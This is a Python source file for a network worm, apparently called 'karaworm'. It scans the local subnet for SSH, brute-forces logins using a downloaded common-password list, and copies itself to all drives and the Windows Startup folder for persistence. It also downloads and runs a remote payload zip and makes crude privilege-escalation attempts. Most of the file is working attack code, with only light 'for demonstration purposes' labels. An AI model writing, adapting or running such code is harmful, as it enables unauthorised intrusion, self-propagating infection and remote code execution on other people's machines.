import nmap
import paramiko
import os
import socket
from urllib.request import urlopen
import urllib
import time
from ftplib import FTP
import ftplib
from shutil import copy2
import win32api
import netifaces
from threading import Thread
import random
import string
import subprocess
import sys
import platform
import zipfile
import requests
import getpass

# ------------------- Logging ----------------------- #
import coloredlogs, logging
logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s', level='DEBUG', logger=logger)
# --------------------------------------------------- #

# Gets gateway of the network
gws = netifaces.gateways()
gateway = gws['default'][netifaces.AF_INET][0]

# List of common usernames for SSH bruteforcing
COMMON_USERNAMES = ["root", "admin", "user", "ubuntu", "kali"]

# List of common SSH passwords (can be extended or loaded from a file)
COMMON_PASSWORDS = ["password", "123456", "admin", "root", "password123"]

# Payload URL (for demonstration purposes, replace with your own)
PAYLOAD_URL = "https://example.com/payload.zip"

def scan_hosts(port):
    """
    Scans all machines on the same network that have the specified port open.
    Returns:
        IP addresses of hosts
    """
    logger.debug(f"Scanning machines on the same network with port {port} open.")
    logger.debug("Gateway: " + gateway)

    port_scanner = nmap.PortScanner()
    port_scanner.scan(gateway + "/24", arguments=f'-p{str(port)} --open')

    all_hosts = port_scanner.all_hosts()
    logger.debug("Hosts: " + str(all_hosts))
    return all_hosts

def download_ssh_passwords(filename):
    """
    Downloads most commonly used SSH passwords from a specific URL.
    Args:
        filename - Name to save the file as.
    """
    logger.debug("Downloading passwords...")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
    urllib.request.urlretrieve(url, filename)
    logger.debug("Passwords downloaded!")

def connect_to_ftp(host, username, password):
    """
    Attempts to connect to an FTP server.
    Args:
        host - Target machine's IP
        username - FTP username
        password - FTP password
    """
    try:
        ftp = FTP(host)
        ftp.login(username, password)
        logger.debug(f"Successfully connected to FTP server at {host}.")
        return ftp
    except ftplib.all_errors as error:
        logger.error(f"FTP connection error: {error}")
        return None

def connect_to_ssh(host, username, password):
    """
    Tries to connect to an SSH server.
    Returns:
        True - Connection successful
        False - Something went wrong
    Args:
        host - Target machine's IP
        username - SSH username
        password - SSH password
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logger.debug(f"Connecting to: {host} as {username}")
        client.connect(host, 22, username, password)
        logger.debug("Successfully connected!")
        return client
    except socket.error:
        logger.error("Computer is offline or port 22 is closed")
        return False
    except paramiko.ssh_exception.AuthenticationException:
        logger.error("Wrong Password or Username")
        return False
    except paramiko.ssh_exception.SSHException:
        logger.error("No response from SSH server")
        return False

def bruteforce_ssh(host, wordlist):
    """
    Bruteforces SSH credentials using a wordlist.
    Args:
        host - Target machine's IP
        wordlist - TXT file with passwords
    """
    file = open(wordlist, "r")
    passwords = file.readlines()
    file.close()

    for username in COMMON_USERNAMES:
        for password in passwords:
            password = password.strip()
            logger.debug(f"Trying {username}:{password}")
            if connect_to_ssh(host, username, password):
                logger.debug(f"Success! Credentials: {username}:{password}")
                return True
            time.sleep(1)  # Avoid triggering rate limits
    return False

def drivespreading():
    """
    Spreads the script to other drives and the startup folder.
    """
    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
    while True:
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        for drive in drives:
            try:
                if "C:\\" == drive:
                    copy2(__file__, bootfolder)
                else:
                    copy2(__file__, drive)
            except Exception as e:
                logger.error(f"Error copying to {drive}: {e}")
        time.sleep(60)  # Reduce frequency to avoid detection

def start_drive_spreading():
    """
    Starts the drive spreading function in a separate thread.
    """
    thread = Thread(target=drivespreading)
    thread.daemon = True
    thread.start()

def execute_command_remotely(host, username, password, command):
    """
    Executes a command on a remote machine via SSH.
    Args:
        host - Target machine's IP
        username - SSH username
        password - SSH password
        command - Command to execute
    """
    client = connect_to_ssh(host, username, password)
    if client:
        stdin, stdout, stderr = client.exec_command(command)
        logger.debug(f"Command output: {stdout.read().decode()}")
        client.close()
        return True
    return False

def download_and_execute_payload(url):
    """
    Downloads and executes a payload from a remote URL.
    Args:
        url - URL of the payload
    """
    try:
        logger.debug(f"Downloading payload from {url}")
        response = requests.get(url)
        payload_path = os.path.join(os.getcwd(), "payload.zip")
        with open(payload_path, "wb") as f:
            f.write(response.content)
        
        # Extract and execute the payload
        with zipfile.ZipFile(payload_path, "r") as zip_ref:
            zip_ref.extractall("payload")
        logger.debug("Payload downloaded and extracted.")
        
        # Execute the payload (example: run a script)
        if platform.system() == "Windows":
            subprocess.Popen(["python", "payload/payload.py"], shell=True)
        else:
            subprocess.Popen(["python3", "payload/payload.py"])
        logger.debug("Payload executed.")
    except Exception as e:
        logger.error(f"Error downloading or executing payload: {e}")

def escalate_privileges():
    """
    Attempts to escalate privileges on the local machine.
    """
    try:
        if platform.system() == "Windows":
            # Example: Use a Windows privilege escalation exploit
            subprocess.Popen(["whoami", "/all"], shell=True)
        else:
            # Example: Use a Linux privilege escalation exploit
            subprocess.Popen(["sudo", "whoami"], shell=True)
        logger.debug("Privilege escalation attempted.")
    except Exception as e:
        logger.error(f"Error escalating privileges: {e}")

def main():
    """
    Main function to execute the script.
    """
    start_drive_spreading()
    wordlist = "ssh_passwords.txt"
    download_ssh_passwords(wordlist)
    hosts = scan_hosts(22)  # Scan for SSH hosts
    for host in hosts:
        if bruteforce_ssh(host, wordlist):
            logger.debug(f"Compromised host: {host}")
            # Example: Execute a command on the compromised host
            execute_command_remotely(host, "root", "password123", "echo 'Hello from karaworm.py'")
    
    # Download and execute a payload (for demonstration purposes)
    download_and_execute_payload(PAYLOAD_URL)

    # Attempt privilege escalation
    escalate_privileges()

if __name__ == "__main__":
    main()
